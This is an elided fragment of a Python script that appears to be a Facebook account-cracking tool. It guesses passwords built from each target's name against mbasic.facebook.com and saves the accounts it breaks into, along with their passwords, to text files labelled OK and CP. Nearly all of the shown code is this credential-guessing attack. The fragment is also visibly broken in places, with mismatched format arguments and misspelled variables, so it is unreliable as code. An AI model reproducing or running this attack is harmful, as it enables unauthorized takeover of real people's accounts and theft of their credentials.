...
##     ## ######## ##     ## ##     ## #### ##    ##    
---------------------------------------------------
AUTHOR    : aryano paktiawall
GITHUB    : aryano paktiawall
FACEBOOK  : aryano paktiawall
TOOL NAME : 0703486628
TYPE TYPE : FREE 
VERSION   : 1.83.0
---------------------------------------------------""")                                           
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mALAMIN_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mALAMIN_CP.txt' % (H, P, str(len(cp))))
...
def alamin():
    ...
    print(' [E] exit ')
    print('')
    _alamin___ = input(' [?] Choose option : ')
    if _alamin___ in ('1', '01'):
        __xxx__().alaminx(id)
    if _alamin___ in ('2', '02'):
        create_file()
    if _alamin___ in ('E', 'ee'):
        pass
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[ALAMIN] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [ALAMIN-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('ALAMIN_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [ALAMIN-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('ALAMIN_CP.txt' , 'a').write('%s\n' % wrt)
                        break
                ...
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        ALAMINworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
